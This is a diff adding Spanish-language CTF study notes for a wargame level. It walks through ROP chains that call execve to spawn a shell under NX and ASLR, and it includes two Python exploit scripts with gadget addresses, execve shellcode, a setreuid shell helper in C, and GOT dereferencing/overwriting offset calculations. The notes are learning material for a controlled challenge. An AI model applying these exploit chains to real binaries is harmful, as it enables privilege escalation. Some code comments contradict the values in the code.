@@ -1,0 +1,232 @@
+
+Level10-Ropme:
+
+Referencias:
+Para jugar:
+http://wargame2k10.nuitduhack.com/
+Para aprender:
+http://danigargu.blogspot.com.es/2013/01/having-fun-with-rop-nxaslr-bypass-linux_18.html
+
+Básicamente se trata de seguir la guia de arriba, está muy bien escrita, todo un crack el que hace ese blog.
+
+1.- Usar ropeme(ropshell.py) para encontrar gagdgets con los que ir saltando de ret en ret para adecuar los registros y la pila a una llamada a execve
+
+./ropshell.py
+generate ./level10_ropme
+load ./level10_ropme.ggt
+search ....
+
+
+Gadgets a utilizar
+
+    1.- 0x8052341L: pop edx ; pop ecx ; pop ebx ;;
+    2.- 0x80853a6L: inc ecx ; adc al 0x39 ;;
+    3.- 0x804ece9L: inc edx ; add al 0x83 ;;
+    4.- 0x804825cL: xor eax eax ; inc eax ;;
+    5.- 0x804825eL: inc eax ;;
+    6.- 0x8048260L: int 0x80 ; pop ebp ;;
+
+Con estos 6 gadgets tenemos suficiente para hacer una llamada a execve, ya que tenemos el control sobre eax (4, 5), ebx (1), ecx (1, 2) y edx (1, 3). Ahora tenemos que conseguir que dichos registros tengan los siguientes valores:
+
+    EAX = 0xb (syscall execve)
+    EBX = puntero a cadena
+    ECX = 0x0 (NULL)
+    EDX = 0x0 (NULL)
+	
+
+2.- El puntero a cadena se puede solucionar de dos maneras dependiendo si tenemos ASLR activado:
+
+	- Sin ASLR: Generamos una variable de entorno y pasamos esa dirección a EBX:
+		export EGG='/bin/sh'
+		./getenv EGG ./level10_ropme
+		Var is stored at address 0xbffffb76
+		Pointer: 0xbffffb76	 LongArg0: 8	 LongArg2: 15
+		EGG will be at 0xbffffb68
+		
+		
+	
+El fichero python quedaría así:
+#!/usr/bin/python
+#
+# Exploit ROP
+#
+ 
+from struct import pack
+ 
+binary = "level10"
+junk = "A" * 12
+
+shell_string = pack('<I', 0xbffffb68) # string: cntrl
+
+ 
+rop = pack('<I', 0x08052318)    # pop edx 
+rop += pack('<I', 0xffffffff)   # pop edx (ebx = 0xffffffff)
+rop += pack('<I', 0x0806568a)	# pop ecx
+rop += pack('<I', 0xffffffff)   # pop ecx (ebc = 0xffffffff)
+rop += pack('<I', 0x08052343)	# pop ebx
+rop += shell_string             # pop ebx (ebx = 0x080b1953)
+rop += pack('<I', 0x080853a6)   # inc ecx ; adc al 0x39 ;; (ecx = 0x0)
+rop += pack('<I', 0x080687c3)   # inc edx ; add al 0x83 ;; (edx = 0x0)
+rop += pack('<I', 0x0804825c)   # xor eax eax ; inc eax ;; (eax = 0x1)
+rop += pack('<I', 0x0804825e)   # inc eax ;; (eax = 0x2)
+rop += pack('<I', 0x0804825e)   # inc eax ;; (eax = 0x3)
+rop += pack('<I', 0x0804825e)   # inc eax ;; (eax = 0x4)
+rop += pack('<I', 0x0804825e)   # inc eax ;; (eax = 0x5)
+rop += pack('<I', 0x0804825e)   # inc eax ;; (eax = 0x6)
+rop += pack('<I', 0x0804825e)   # inc eax ;; (eax = 0x7)
+rop += pack('<I', 0x0804825e)   # inc eax ;; (eax = 0x8)
+rop += pack('<I', 0x0804825e)   # inc eax ;; (eax = 0x9)
+rop += pack('<I', 0x0804825e)   # inc eax ;; (eax = 0xa)
+rop += pack('<I', 0x0804825e)   # inc eax ;; (eax = 0x9)
+rop += pack('<I', 0x08048260)   # int 0x80 ; pop ebp ;;
+#rop += pack('<I', 0x08052a00)   # int 0x80 ; pop ebp ;;
+rop += pack('<I', 0x0806568a)	# pop ecx
+
+payload = junk + rop 
+ 
+print payload
+
+# Fin fichero python
+
+Nota: Cuando llamas a int 0x80 no se puede utilizar solo la llamada a la función porque no funciona, tiene que tener otra microinstrucción detrás. Es algo raro para investigar:
+
+rop += pack('<I', 0x08048260)   # int 0x80 ; pop ebp ;;
+#rop += pack('<I', 0x08052a00)   # int 0x80 ;; <---- Con esto no funciona ¿?
+
+
+
+		
+	- Con ASLR: Buscar una cadena en una sección no randomizable para luego crearnos un pequeño binario con el nombre de esa cadena que nos brinde un shell:
+		rabin2 -z level10_ropme | grep -A 4 cntrl
+		Warning: Cannot initialize dynamic strings
+		vaddr=0x080b1953 paddr=0x00069953 ordinal=738 sz=6 len=5 section=.rodata type=ascii string=cntrl
+		vaddr=0x080b195f paddr=0x0006995f ordinal=740 sz=6 len=5 section=.rodata type=ascii string=alnum
+		
+		La dirección 0x080b1953 es la tendremos asignar a cntrl_string en exploit.py
+		
+		Elegimos cntrl y nos creamos la shell:
+		
+		cat cntrl.c
+		#include <stdio.h>
+		#include <unistd.h>
+		 
+		int main(void)
+		{
+		 int euid = geteuid();
+		 setreuid(euid, euid);
+		 execv("/bin/sh", NULL);
+		}
+		
+		
+
+#!/usr/bin/python
+#
+# Exploit ROP con ASLR
+#
+ 
+from struct import pack
+ 
+binary = "level10"
+junk = "A" * 12
+ 
+cntrl_string = pack('<I', 0x080b1953) # string: cntrl
+
+ 
+rop = pack('<I', 0x08052341)    # pop edx ; pop ecx ; pop ebx ;;
+rop += pack('<I', 0xffffffff)   # pop edx (ebx = 0xffffffff)
+rop += pack('<I', 0xffffffff)   # pop ecx (ebc = 0xffffffff)
+rop += cntrl_string             # pop ebx (ebx = 0x080b1953)
+rop += pack('<I', 0x080853a6)   # inc ecx ; adc al 0x39 ;; (ecx = 0x0)
+rop += pack('<I', 0x0804ece9)   # inc edx ; add al 0x83 ;; (edx = 0x0)
+rop += pack('<I', 0x0804825c)   # xor eax eax ; inc eax ;; (eax = 0x1)
+rop += pack('<I', 0x0804825e)   # inc eax ;; (eax = 0x2)
+rop += pack('<I', 0x0804825e)   # inc eax ;; (eax = 0x3)
+rop += pack('<I', 0x0804825e)   # inc eax ;; (eax = 0x4)
+rop += pack('<I', 0x0804825e)   # inc eax ;; (eax = 0x5)
+rop += pack('<I', 0x0804825e)   # inc eax ;; (eax = 0x6)
+rop += pack('<I', 0x0804825e)   # inc eax ;; (eax = 0x7)
+rop += pack('<I', 0x0804825e)   # inc eax ;; (eax = 0x8)
+rop += pack('<I', 0x0804825e)   # inc eax ;; (eax = 0x9)
+rop += pack('<I', 0x0804825e)   # inc eax ;; (eax = 0xa)
+rop += pack('<I', 0x0804825e)   # inc eax ;; (eax = 0xb -> execve())
+rop += pack('<I', 0x08048260)   # int 0x80 ; pop ebp ;;
+
+fin = "\x90\x90\x90\x90\xfc\xf2\xff\xbf"
+#payload = "\x31\xc0\x99\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80"
+payload = "\xeb\x10\x5e\x31\xc0\x88\x46\x07\xb0\x0b\x89\xf3\x31\xc9\x31\xd2\xcd\x80\xe8\xeb\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x23"
+
+payload = junk + rop 
+ 
+print payload
+
+# Fin fichero python
+	
+	
+
+- Todo lo anterior está muy bien, pero que pasa si no tenemos una sección no randomizable tenemos un problema.
+
+Ref: http://danigargu.blogspot.com.es/2013/02/got-dereferencing-overwriting-aslrnx.html
+Ref: ROP-libc.pdf
+
+	Lo que sigue es casi un copia y pega de las refencias anteriores. 
+
+	Como ver las propiedades de las secciones del binario:
+		objdump -h binary
+		readelf -S binary
+	
+	La sección .got y .got.plt no son dinámicas (no afectadas por ASLR) y además son ejecutables. Es necesario que sean así porque son creadas por el linkador para saber donde están las librerías dinámicas. Ya que la GOT y la PLT se utilizan directamente desde cualquier parte del programa, necesitan disponer de una dirección estática conocida en la memoria. Además, la GOT necesita tener permisos de escritura, ya que cuando se resuelve la dirección de una función, es escrita en su correspondiente entrada de la GOT.
+	
+	¿Y para qué se puede aprovechar todo esto?
+
+	Como las direcciones de la sección GOT son estáticas (no afectadas por ASLR), y se dispone de permisos de escritura, se puede aprovechar para sobreescribir la dirección de una función utilizada en el programa (p.e, strcpy), por otra con peores intenciones (p.e, system), de forma que cuando se invoque a la entrada PLT de la función sobreescrita, el flujo del programa vaya hacia la otra. 
+	
+	Resolver direcciones de la libc
+
+	Perfecto, si se consigue sobreescribir el contenido de la GOT de una función por la dirección de otra función de la libc, es posible realizar cualquier llamada (incluido a las funciones no exportadas). Pero vaya, no es tan fácil como pinta, ya que la libc es afectada por ASLR y sus direcciones varían en cada ejecución. Pero no del todo ;-)
+
+	
+		1 offset = system() - strcpy()
+		2 system() = strcpy() + offset
+
+	Para poder llevar a cabo esto, existen dos técnicas: GOT Dereferencing y GOT Overwriting, que sirven básicamente para re-calcular funciones de la libc a partir de la GOT de una función usada en el programa, empleando ROP.
+
+    GOT dereferencing: Consiste en combinar ROP gadgets para leer la dirección absoluta de cualquier función usada en el programa (p.e, strcpy) a partir su entrada en la GOT, utilizar dicha dirección para calcular la de otra función de la biblioteca (p.e, system), y realizar un salto hacia ella.
+	
+    GOT overwriting: Es similar a la anterior, pero aquí en vez de leer la dirección de una función y calcular la de otra, se sobreescribe la entrada GOT de una de ellas (p.e, strcpy) con la dirección tiene más el offset de la función a usar (p.e, system). Por último, se invoca a la PLT de la función sobreescrita haciendo un ret2plt.
+
+	
+	1.- GOT DEFERENCING
+	
+	El valor fijo de printf es, aquí tener en cuenta que en la segunda llamada escribe en 
+	
+	objdump -R cheer_msg | grep printf
+	0804a010 R_386_JUMP_SLOT   printf@GLIBC_2.0
+	
+	Dos maneras de calcular el offset respecto a printf por ejemplo:
+	
+	a) Usando objdump:
+	
+	objdump -T /lib/i386-linux-gnu/libc.so.6 | grep system
+	0003ab30  w   DF .text	00000037  GLIBC_2.0   system
+	
+	objdump -T /lib/i386-linux-gnu/libc.so.6 | grep printf
+	00049930 g    DF .text	0000002a  GLIBC_2.0   printf
+
+	libc:
+	00049930 printf 
+	0003ab30 system
+	
+	offset = system-printf = FFFFFFFFFFFF1200
+	
+	b) Usando gdb:
+	
+	gdb-peda$ p system
+	$1 = {<text variable, no debug info>} 0xb7e32b30 <__libc_system>
+	gdb-peda$ p printf
+	$2 = {<text variable, no debug info>} 0xb7e41930 <__printf>
+	gdb-peda$ p /x 0xb7e32b30-0xb7e41930
+	$3 = 0xffff1200
+	gdb-peda$ x/2i printf+0xffff1200
+	0xb7e32b30 <__libc_system>:	sub    esp,0xc
+	0xb7e32b33 <__libc_system+3>:	mov    eax,DWORD PTR [esp+0x10]
+	
